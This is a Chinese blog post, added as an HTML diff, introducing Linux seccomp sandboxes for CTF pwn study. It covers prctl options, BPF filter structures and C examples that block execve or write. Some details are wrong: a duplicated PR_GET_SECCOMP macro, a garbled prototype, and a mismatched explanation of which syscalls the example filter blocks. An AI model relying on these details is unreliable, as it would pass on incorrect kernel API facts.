@@ -1,0 +1,614 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Pwn" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/9d5b1ce4.html">
+
+
+
+  <title>
+pwn学习笔记（8）-初识沙箱 - Pwn手的自我修养 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">pwn学习笔记（8）-初识沙箱
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-08-06 04:04:38">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-08-06T04:04:38+08:00">2024-08-06</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture306.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Pwn/" itemprop="item" rel="index" title="分类于 Pwn手的自我修养"><span itemprop="name">Pwn手的自我修养</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/9d5b1ce4.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="初识pwn沙箱"><a class="markdownIt-Anchor" href="#初识pwn沙箱">#</a> 初识 Pwn 沙箱</h1>
+<p>​		沙箱机制，英文 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p>
+<p>​		安全计算模式 seccomp（Secure Computing Mode）在 Linux2.6.10 之后引入到 kernel 的特性，可用其实现一个沙箱环境。使用 seccomp 模式可以定义系统调用白名单和黑名单。seccomp 机制用于限制应用程序可以使用的系统调用，增加系统的安全性。</p>
+<p>​		在 ctf 中主要通过两种方式实现沙箱机制：</p>
+<ul>
+<li>prctl 系统调用；</li>
+<li>seccomp 库函数；</li>
+</ul>
+<h2 id="1-prctl函数初探"><a class="markdownIt-Anchor" href="#1-prctl函数初探">#</a> 1、prctl 函数初探</h2>
+<p>​		prctl 是基本的进程管理函数，最原始的沙箱规则就是通过 prctl 函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。</p>
+<p>​		下面是 /linux/prctl.h 和 seccomp 相关的源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP     22</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS    38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS    39</span></span><br></pre></td></tr></table></figure>
+<p>​		<strong>prctl 函数原型</strong>：int prctl (int option,unsigned long argv2,unsigned long argv3,unsigned long argv4，unsigned long argv3)</p>
+<p>在具体了解 prctl 函数之前，我们再了解这样一个概念：沙箱。沙箱 (Sandbox) 是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp 是内核中的一种安全机制，seccomp 可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp 规则的设置，可以使用 prctl 函数和 seccomp 函数族。</p>
+<p>​		<strong>include/linux/prctl.h 里面存储着 prctl 的所有参数的宏定义，prctl 的五个参数中，其中第一个参数是你要做的事情，后面的参数都是对第一个参数的限定。</strong></p>
+<p>​		在第一个参数中，我们需要重点关注的参数有这两个：</p>
+<ol>
+<li>PR_SET_SECCOMP (22)：当第一个参数是 PR_SET_SECCOMP, 第二个参数 argv2 为 1 的时候，表示允许的系统调用有 read，write，exit 和 sigereturn；当 argv 等于 2 的时候，表示允许的系统调用由 argv3 指向 sock_fprog 结构体定义，该结构体成员指向的 sock_filter 可以定义过滤任意系统调用和系统调用参数。(细节见下图)</li>
+<li>PR_SET_NO_NEWPRIVS (38):prctl (38,1,0,0,0) 表示禁用系统调用 execve () 函数，同时，这个选项可以通过 fork () 函数和 clone () 函数继承给子进程。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>        len;    <span class="comment">/* 指令个数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/*指向包含struct sock_filter的结构体数组指针*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16 code;                 <span class="comment">/* Actual filter code,bpf指令码 */</span></span><br><span class="line">    __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//seccomp-data结构体记录当前正在进行bpf规则检查的系统调用信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> nr;<span class="comment">//系统调用号</span></span><br><span class="line">    __u32 arch;<span class="comment">//调用架构</span></span><br><span class="line">    __u64 instruction_pointer;<span class="comment">//CPU指令指针</span></span><br><span class="line">    __u64 argv[<span class="number">6</span>];<span class="comment">//寄存器的值，x86下是ebx，exc,edx,edi,ebp;x64下是rdi,rsi,rdx,r10,r8,r9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="2-prctl函数详解"><a class="markdownIt-Anchor" href="#2-prctl函数详解">#</a> 2、prctl () 函数详解</h2>
+<p>​		 <code>prctl</code>  是一个系统调用，用于控制和修改进程的行为和属性。它可以在 Linux 系统上使用，提供了各种功能和选项来管理进程的不同方面。</p>
+<p>​		以下是 <code>prctl</code>  函数的基本原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prctl</span><span class="params">(<span class="type">int</span> option, <span class="type">unsigned</span> <span class="type">long</span> arg2, <span class="type">unsigned</span> <span class="type">long</span> arg3, <span class="type">unsigned</span> <span class="type">long</span> arg4, <span class="type">unsigned</span> <span class="type">long</span> arg5)</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>​	prctl 函数接受不同的 option 选项和参数，用于执行不同的操作。下面是一些常用的 option 选项及其功能：</p>
+<ul>
+<li>PR_SET_NAME：设置进程名称。</li>
+<li>PR_GET_NAME：获取进程名称。</li>
+<li>PR_SET_PDEATHSIG：设置在父进程终止时发送给当前进程的信号。</li>
+<li>PR_GET_PDEATHSIG：获取父进程终止时发送给当前进程的信号。</li>
+<li>PR_SET_DUMPABLE：设置进程的可转储标志，影响核心转储。</li>
+<li>PR_GET_DUMPABLE：获取进程的可转储标志。</li>
+<li>PR_SET_SECCOMP：设置进程的安全计算模式。</li>
+<li>PR_GET_SECCOMP：获取进程的安全计算模式。</li>
+</ul>
+</blockquote>
+<p>​		这些仅是一些常用的选项， <code>prctl</code>  还支持其他选项和功能。每个选项都有特定的参数，可以根据需要传递。具体的参数和行为取决于所选的选项。</p>
+<p>​		以下是一个简单的示例，展示了如何使用 <code>prctl</code>  函数设置进程名称：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* process_name = <span class="string">&quot;MyProcess&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) process_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程名称</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_GET_NAME, (<span class="type">unsigned</span> <span class="type">long</span>) name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Process name: %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		在上述示例中，我们使用 prctl 函数将当前进程的名称设置为 &quot;MyProcess&quot;。然后，我们再次使用 prctl 函数获取进程的名称，并将其打印到标准输出。</p>
+<p>​		请注意，prctl 函数的具体行为和可用选项可能因操作系统和版本而异。在使用 prctl 函数时，应该查阅相关文档并了解所使用的操作系统的支持和限制。</p>
+<h2 id="3-bpf过滤规则伯克利封装包过滤"><a class="markdownIt-Anchor" href="#3-bpf过滤规则伯克利封装包过滤">#</a> 3、BPF 过滤规则 (伯克利封装包过滤)</h2>
+<p>​		突破沙箱规则，本质上就是一种越权漏洞。seccomp 是 linux 保护进程安全的一种保护机制，它通过对系统调用函数的限制，来保护内核态的安全。所谓沙箱，就是把用户态和内核态相互分离开，让用户态的进程，不要影响到内核态，从而保证系统安全。</p>
+<p>​		如果我们在沙箱中，完全遵守 seccomp 机制，我们便只能调用 exit (),sigreturn (),read () 和 write () 这四种系统调用，那么其实我们的进程应该是安全的（其实也不一定，后面的例题就没有溢出，而是通过系统调用直接读取文件）。但是，由于他的规则过于死板，所以后面出现了过滤模式，让我们可以调用到那些系统调用。回顾上面提到的 PT_SET_SECCOMP 这个参数，后面接到的第一个参数，就是它设置的模式，第三个参数，指向 sock_fprog 结构体，sock_fprog 结构体中，又有指向 sock_filter 结构体的指针，sock_filter 结构体这里，就是我们要设置规则的地方。</p>
+<p>我们在设置过滤规则，在面对沙箱题目的时候，会经常用到 Seccomp-tools 这个工具。</p>
+<p><strong>BPF 指令集简介</strong></p>
+<blockquote>
+<p>BPF_LD：加载操作，BPF_H 表示按照字节传送，BPF_W 表示按照双字来传送，BPF_B 表示传送单个字节。</p>
+<p>BPF_LDX：从内存中加载 byte/half-word/word/double-word。</p>
+<p>BPF_ST,BPF_STX：存储操作</p>
+<p>BPF_ALU,BPT_ALU64：逻辑操作运算。</p>
+<p>BPT_JMP：跳转操作，可以和 JGE，JGT，JEQ，JSET 一起表示有条件的跳转，和 BPF_JA 一起表示没有条件的跳转。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/prctl.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/bpf.h&gt;</span>             <span class="comment">//off和imm都是有符号类型，编码信息定义在内核头文件linux/bpf.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[]=</span>&#123;</span><br><span class="line">                BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),   <span class="comment">// 从第0个字节开始，传送4个字节</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>), <span class="comment">// 比较是否为59（execve 的系统调用号），是就跳过下一行，如果不是，就执行下一行，第三个参数表示执行正确的指令跳转，第四个参数表示执行错误的指令跳转</span></span><br><span class="line">                BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        <span class="comment">//      BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span></span><br><span class="line">        <span class="comment">//        杀死一个进程</span></span><br><span class="line">        <span class="comment">//        BPF_STMP(BPF_RET+BPF_K,SECCOMP_RET_TRACE),</span></span><br><span class="line">        <span class="comment">//        父进程追踪子进程，具体没太搞清楚</span></span><br><span class="line">                 BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ERRNO),</span><br><span class="line">        <span class="comment">//        异常处理</span></span><br><span class="line">                BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">//        这里表示系统调用如果正常，允许系统调用</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span>=</span>&#123;</span><br><span class="line">                .len=<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(sock_filter[<span class="number">0</span>]),</span><br><span class="line">                .filter=filter,</span><br><span class="line">        &#125;;</span><br><span class="line">        prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);<span class="comment">//第一个参数是进行什么设置，第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		开始的时候，我们设置了 sock_filter 结构体数组。这里为什么是一个结构体数组呢？因为我们看到里面有 BPF_STMT 和 BPF_JMP 的宏定义，其实 BPF_STMT 和 BPF_JMP 都是条件编译后赋值的 sock_filter 结构体。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_STMT(code,k)&#123;(unsigned short)(code),0,0,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span>     BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    BPF_JUMP(code,k,jt,jf)&#123;(unsigned short)(code),jt,jf,k&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>​		上面的例子中禁用了 execve 的系统调用号，64 位系统中 execve 的系统调用号是 59.</p>
+<p>​		BPF_JUMP 后的第二个参数是我们要设置的需要禁用的系统调用号。</p>
+<p>​		我们在这里禁用的两个系统调用分别是 sys_restart_syscall 和 execve，如果出现这两个系统调用，那么我们就会跳转到 BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_ERRNO) 的异常处理。其实，如果我们要直接杀死这个进程的话，BPF_STMP (BPF_RET+BPF_K,SECCOMP_RET_KILL) 这个规则可以直接杀死进程。</p>
+<p>​		GitHub 上的一个真实例子：</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZm50bG56LzA4YWUyMGJlZmI5MWJlZmQ5YTUzY2Q5MWNkYzZkNTA3">例子</span></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">install_filter</span><span class="params">(<span class="type">int</span> nr, <span class="type">int</span> arch, <span class="type">int</span> error)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, arch))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class="number">0</span>, <span class="number">3</span>),</span><br><span class="line">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class="line">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">      .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">      .filter = filter,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;something&#x27;s gonna happen!!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;it will not definitely print this here\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		用  <code>seccomp-tools</code>  来 dump 下看看：</p>
